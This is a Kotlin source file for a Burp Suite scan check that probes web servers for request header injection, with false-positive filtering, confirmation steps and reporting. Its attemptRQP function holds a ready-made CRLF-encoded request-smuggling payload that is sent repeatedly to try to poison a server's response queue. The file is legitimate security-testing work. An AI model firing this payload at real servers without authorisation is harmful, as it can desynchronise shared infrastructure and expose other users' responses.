package burp

import burp.ReqMutator.Companion.headerBasedMutations
import burp.ReqMutator.Companion.paramMinerMutations
import burp.ReqMutator.Companion.pathBasedMutations
import burp.ReqMutator.Companion.protocolBasedMutations
import burp.ReqMutator.Companion.smuggleBasedMutations
import burp.api.montoya.http.HttpMode
import burp.api.montoya.http.message.HttpRequestResponse
import burp.api.montoya.http.message.params.HttpParameter
import burp.api.montoya.http.message.requests.HttpRequest
import burp.api.montoya.http.message.responses.analysis.AttributeType
import kotlin.random.Random


//this is a basic scan check implementation
internal class ReqHeaderInjectionScan(name: String?) : Scan(name) {

    val interestingAttributes = setOf(
        AttributeType.STATUS_CODE,
        AttributeType.CONTENT_TYPE,
        AttributeType.LINE_COUNT,
        AttributeType.WORD_COUNT
        //AttributeType.CONTENT_LENGTH - produces a LOT of false positives...
    )

    val mutator = ReqMutator()

    //Init is a constructor in Kotlin. Import any settings you wanted outside of the global ones
    init {
        super.name

        scanSettings.register("Filter Known FP", true)
        // scanSettings.register("Enable dodgy BPS diff", false, "If predicted match fails, report findings based Backslash Powered Scanner-style diff") // We don't need this anymore since we report a "firmer" version if we can and then follow up with diff afterwards.
        // That said, might be usedful for param-miner-style guessing of headers for header smuggling etc?
        scanSettings.register("Enable param-miner headers", false, "Check for any header in the param-miner list that causes a significant difference in the response (server header + status)")
	    scanSettings.register("maintain path", false)
        scanSettings.register("Log issues to output", false)
        scanSettings.register("Enable follow up", true, "Follow up with a few more probes to better confirm true positives.")
        //scanSettings.register("include query-param in cachebusters", false, "Breaks things sometimes...") //Maybe this doesn't break things...
        scanSettings.register("Enable fallback diff", true, "Fallback to diffing <serverStatus> if expected match fails")
        scanSettings.register("Encode-colons", true, ": -> %3a")
        scanSettings.register("Encode-forward-slash", true, "/ -> %2f")
        scanSettings.register("Encode-period", true, ". -> %2e")
        scanSettings.register("Add cache buster", true, "Disable if you fancy a chance at a http1mustdie-style CDN desync")
        scanSettings.register("attempt poc", false, "Automatically follow up with RQP attempt")
        scanSettings.register("Enable method override", false, "Enables method override")
        scanSettings.register("method override", "POST", "Force this method")
        scanSettings.register("Enable path override", false, "Enables path override")
        scanSettings.register("path override", "/favicon.ico", "Force this base path")
        scanSettings.importSettings(BurpExtender.configSettings)
        scanSettings.importSettings(headerBasedMutations)
        scanSettings.importSettings(pathBasedMutations)
        scanSettings.importSettings(protocolBasedMutations)
        scanSettings.importSettings(smuggleBasedMutations)
        //scanSettings.importSettings(paramMinerMutations) NO don't do this.

    }

    //this is where your scan logic goes
    override fun doScan(baseReq: ByteArray, service: IHttpService): MutableList<IScanIssue> {
        try {
            val wafChecker = WAFChecker()

            var pocHasRun = false

            // Add all the enabled permutations types
            val enabledMutations = arrayListOf<String>()
            for (mutation in headerBasedMutations.settings) {
                if (Utilities.globalSettings.getBoolean(mutation)) {
                    enabledMutations.add(mutation)
                }
            }
            for (mutation in pathBasedMutations.settings) {
                if (Utilities.globalSettings.getBoolean(mutation)) {
                    enabledMutations.add(mutation)
                }
            }
            for (mutation in protocolBasedMutations.settings) {
                if (Utilities.globalSettings.getBoolean(mutation)) {
                    enabledMutations.add(mutation)
                }
            }
            for (mutation in smuggleBasedMutations.settings) {
                if (Utilities.globalSettings.getBoolean(mutation)) {
                    enabledMutations.add(mutation)
                }
            }
            //Add param miner headers if enabled
            if (Utilities.globalSettings.getBoolean("Enable param-miner headers")) {
                for (mutation in paramMinerMutations.settings) {
                    enabledMutations.add(mutation)
                }
            }

            var forceHP1 = false


            if (Utilities.isHTTP2(baseReq)) {
                forceHP1 = false
            } else {
                forceHP1 = true
            }

            var baseRequest: HttpRequest

            var currentStatusDiff = ""
            var previousStatusDiff = ""

            lateinit var previousBenignRequestResponse: MontoyaRequestResponse
            lateinit var previousProbeRequestResponse: MontoyaRequestResponse

            lateinit var benignRequestResponse: MontoyaRequestResponse
            lateinit var probeRequestResponse: MontoyaRequestResponse

            // for (permutation in permutations) {} //As per the PDS from http1mustdie...
            for (technique in enabledMutations) {
                if (Utilities.unloaded.get()) {
                    break
                }

                //Skip the rest of the techniques if we're told too (when a valid report was found)
                if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") && BulkScan.hostsToSkip.containsKey(service.host)) {
                    break
                }

                //Add OPTIONAL cache buster...
                if (Utilities.globalSettings.getBoolean("Add cache buster")) {
                    baseRequest = Utilities.buildMontoyaResp(request(service, Utilities.addCacheBuster(baseReq, Utilities.generateCanary()))).request()
                } else {
                    baseRequest = Utilities.buildMontoyaResp(request(service, baseReq)).request()
                }

                //Override method if we want...
                if (Utilities.globalSettings.getBoolean("Enable method override")) {
                    baseRequest = baseRequest.withMethod(Utilities.globalSettings.getString("method override"))
                }

                val probe = mutator.getProbe(baseRequest, technique)

                //Check each probe 5 times for consistency...
                for (i in 1..Utilities.globalSettings.getInt("confirmations")) {
                    if (Utilities.unloaded.get()) {
                        break
                    }

                    val sendBenignRequest = {
                        benignRequestResponse = request(probe.benignRequest, forceHP1)

                        !responseHasErrors(benignRequestResponse) //indicate failure
                    }

                    val sendProbeRequest = {
                        probeRequestResponse = request(probe.probeRequest, forceHP1)

                        !(responseHasErrors(probeRequestResponse) && !probe.expectedResponseMatches.contains("TIMEOUT")) //If it's an expected timeout, don't check for errors
                        //indicate failure
                    }


                    //Randomly choose which probe goes first...
                    val runSuccess = if (Random.nextBoolean()) {
                        sendBenignRequest() && sendProbeRequest()
                    } else {
                        sendProbeRequest() && sendBenignRequest()
                    }

                    //Exit if either probe failed
                    if (!runSuccess) {
                        currentStatusDiff = ""
                        break
                    }

                    //Check if the responses are inconsistent on their own...
                    if (i != 1) { //Skip on first run...

                        //Benign
                        if (benignRequestResponse.serverStatus() != previousBenignRequestResponse.serverStatus()) {
                            currentStatusDiff = ""
                            break
                        }

                        //Probe
                        if (probeRequestResponse.serverStatus() != previousProbeRequestResponse.serverStatus()) {
                            currentStatusDiff = ""
                            break
                        }
                    }

                    //Set previous responses to keep track...
                    previousBenignRequestResponse = benignRequestResponse
                    previousProbeRequestResponse = probeRequestResponse


                    //If no difference in responses... then give up
                    if (probeRequestResponse.serverStatus() == benignRequestResponse.serverStatus()) {
                        currentStatusDiff = ""
                        break
                    }

                    currentStatusDiff = "${benignRequestResponse.serverStatus()}|${probeRequestResponse.serverStatus()}"


                    //If after the current repeat our <server><status> strings don't match... something is inconsistent regardless of probe
                    if (i != 1 && previousStatusDiff != currentStatusDiff) {
                        //Make the attributes empty so we can prevent reporting
                        currentStatusDiff = ""
                        break
                    }

                    //If we don't hit all the expected response matches when "Enable fallback Diff" is disabled, we can exit.
                    if (!Utilities.globalSettings.getBoolean("Enable fallback diff")) {
                        for (match in probe.expectedResponseMatches) {
                            if (!probeRequestResponse.response().contains(match, true)) {
                                //If fallback diff isn't enabled, then we can exit early here
                                currentStatusDiff = ""
                                break
                            }
                        }
                    }

                    previousStatusDiff = currentStatusDiff
                }

                // This should be set to "" if there is no difference
                if (currentStatusDiff.isNotEmpty()) {

                    //Check for known false positives...
                    if (Utilities.globalSettings.getBoolean("Filter Known FP") && (wafChecker.isWafResponse(probeRequestResponse.response()) || wafChecker.isWafResponse(benignRequestResponse.response()))) {
                        continue
                    }

                    //If we hit the exact match we hoped for... report immediately
                    //Needs updating i think... should maybe still proove that we got a different response... :thinking:
                    var numberOfMatches = 0

                    if (!probe.expectedResponseMatches.contains("TIMEOUT")) {
                        probe.expectedResponseMatches.forEach {
                            match ->
                                if (match == "NO_HEADERS") {
                                    if (probeRequestResponse.response().statusCode() == "0".toShort()) {
                                        numberOfMatches += 1
                                    }
                                    if (benignRequestResponse.response().statusCode() == "0".toShort()) {
                                        numberOfMatches = 0
                                    }
                                } else {
                                    if (probeRequestResponse.response().contains(match, true)) {
                                        numberOfMatches += 1
                                    }

                                    if (benignRequestResponse.response().contains(match, true)) {
                                        numberOfMatches = 0 //set to 0 to cause the logic below to fail... if the match also appears in the base response it's probably nothing...
                                    }
                                }
                        }
                        if (numberOfMatches != 0 && numberOfMatches == probe.expectedResponseMatches.size) { //If we got a match on every entry one of the expected response matches.

                            if (!Utilities.globalSettings.getBoolean("Enable follow up")) {
                                // Follow up no enabled, skip
                                continue
                            }

                            // No if it is enabled, perform  follow up!
                            if (!confirmedVulnerable(probeRequestResponse, technique)) {
                                // If confirmedVulnerable comes up false... skip
                                continue
                            }

                            //Fix broken responses... (responses without status codes...)
                            if (probeRequestResponse.response().statusCode() == "0".toShort()) {
                                probeRequestResponse = MontoyaRequestResponse(HttpRequestResponse.httpRequestResponse(probeRequestResponse.request(), probeRequestResponse.response().withStatusCode("1337".toShort())))
                            }

                            // Attempt poc (before report otherwise our logic  breaks...)
                            if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") || Utilities.globalSettings.getBoolean("skip flagged hosts")) {
                                if (BulkUtilities.callbacks.getScanIssues(benignRequestResponse.request().httpService().toString()).isEmpty()) {
                                    if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
                                        pocHasRun = true
                                        attemptRQP(baseRequest)
                                    }
                                }
                            } else if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
                                pocHasRun = true
                                attemptRQP(baseRequest)
                            }



                            report("Request Header Injection via $technique",
                                """
                                The application behaves in a manner that is consistent with Request Header Injection...
                                """,
                                baseReq,
                                benignRequestResponse,
                                probeRequestResponse
                            )

                            if (Utilities.globalSettings.getBoolean("Log issues to output")) {
                                Utilities.out("Request Header Injection via $technique at ${benignRequestResponse.request().url()}")
                            }

                            if (Utilities.globalSettings.getBoolean("skip vulnerable hosts")) {
                                BulkScan.hostsToSkip.putIfAbsent(service.host, true)
                            }

                            continue
                        }
                    }

                    if (!Utilities.globalSettings.getBoolean("Enable fallback diff")) {
                        continue
                    }

                    //Skip any techniques that we don't care about checking response attributes for OR just skip altogether if not enabled
                    if (technique in listOf("robots", "sitemap", "favicon")) {
                        continue
                    }


                    if (!Utilities.globalSettings.getBoolean("Enable follow up")) {
                        // Follow up no enabled, skip
                        continue
                    }

                    // No if it is enabled, perform  follow up!
                    if (!confirmedVulnerable(probeRequestResponse, technique)) {
                        // If confirmedVulnerable comes up false... skip
                        continue
                    }

                    // Attempt poc (before report otherwise our logic  breaks...)
                    if (Utilities.globalSettings.getBoolean("skip vulnerable hosts") || Utilities.globalSettings.getBoolean("skip flagged hosts")) {
                        if (BulkUtilities.callbacks.getScanIssues(benignRequestResponse.request().httpService().toString()).isEmpty()) {
                            if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
                                pocHasRun = true
                                attemptRQP(baseRequest)
                            }
                        }
                    } else if (Utilities.globalSettings.getBoolean("attempt poc") && !pocHasRun) {
                        pocHasRun = true
                        attemptRQP(baseRequest)
                    }

                    report(
                        "Request Header Injection via $technique - Dodgy", """
                        The application behaves in a manner that is consistent with Request Header Injection...Sort of
                        """, baseReq, benignRequestResponse, probeRequestResponse
                    )

                    if (Utilities.globalSettings.getBoolean("Log issues to output")) {
                        Utilities.out("Request Header Injection via $technique - Dodgy - at ${benignRequestResponse.request().url()}")
                    }

                    if (Utilities.globalSettings.getBoolean("skip vulnerable hosts")) {
                        BulkScan.hostsToSkip.putIfAbsent(service.host, true)
                    }
                    continue
                }
            }



            return mutableListOf<IScanIssue>()
        } catch(e: Exception) {
            Utilities.err(e.message)
            return mutableListOf<IScanIssue>()
        }
    }

    fun attemptRQP(baseRequest: HttpRequest): Boolean {
        try {
            var basePath = "/"
            if (Utilities.globalSettings.getBoolean(("maintain path"))) {
                basePath = baseRequest.pathWithoutQuery()
            }

            //Attack string is a RQP gadget I hope might work
            val attackRequest = baseRequest.withPath("$basePath%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                    + "GET%20/%20HTTP/1.1%0d%0a%48ost:%20${baseRequest.httpService().host()}%0d%0a%43onnection:%20keep-alive%0d%0a%0d%0a"
                    + "TRACE%20/%20HTTP/1.1%0d%0aX:%20x")

            var previousServerStatus = ""

            for (i in 0..100) {
                if (Utilities.unloaded.get()) {
                    break
                }
                val attackRequestResponse = request(attackRequest, false)
                if (i == 0) {
                    previousServerStatus = attackRequestResponse.serverStatus().toString()
                    continue
                }
                val currentServerStatus = attackRequestResponse.serverStatus().toString()

                if (previousServerStatus != currentServerStatus) {
                    reportToOrganiser("RQP!?!?!?!\r\n$previousServerStatus|$currentServerStatus", attackRequestResponse)
                    return true
                }
            }
            return false
        } catch(e: Exception) {
            Utilities.err(e.message)
            return false
        }
    }

}

fun responseHasErrors(requestResponse: HttpRequestResponse): Boolean {
    if (!requestResponse.hasResponse()) {
        return true
    }
    if (requestResponse.response().toString().isEmpty()) {
        return true
    }
    if (requestResponse.response().statusCode() == "429".toShort()) {
        return true
    }
    return false
}

fun fixMissingStatuscode(requestResponse: HttpRequestResponse): HttpRequestResponse {
    val fixedRequestResponse = HttpRequestResponse.httpRequestResponse(requestResponse.request(), requestResponse.response().withStatusCode("1337".toShort()).withReasonPhrase("No response headers received"))
    return fixedRequestResponse
}

fun confirmedVulnerable(probeReqResp: MontoyaRequestResponse, technique: String): Boolean {
    try {
        //Filter out ones that will break.... robots.txt?anything will of course work so...
        if (technique in listOf("robots", "sitemap", "favicon")) {
            return true
        }

        val confirmReqResp = Scan.request(
            probeReqResp.request().withPath(probeReqResp.request().pathWithoutQuery().replace("%20", "a?%20")), false
        ) //the extra a is a BUG I think

        if (confirmReqResp.serverStatus() == probeReqResp.serverStatus()) {
            //If we get the same response having made the entire path a query component... it's a FProbeReqResp.request().withPath()
            return false
        }

        val confirmReqResp2 = Scan.request(
            probeReqResp.request().withPath(probeReqResp.request().pathWithoutQuery().replaceFirst("%20", "%3f%20")),
            false
        )

        if (confirmReqResp2.serverStatus() != probeReqResp.serverStatus()) {
            //if encoding the query then produces a different serverStatus compared to the probe it's a FP... nginx should be fine with this
            return false
        }

        return true
    } catch (e: Exception) {
        Utilities.err(e.message)
        return false
    }
}
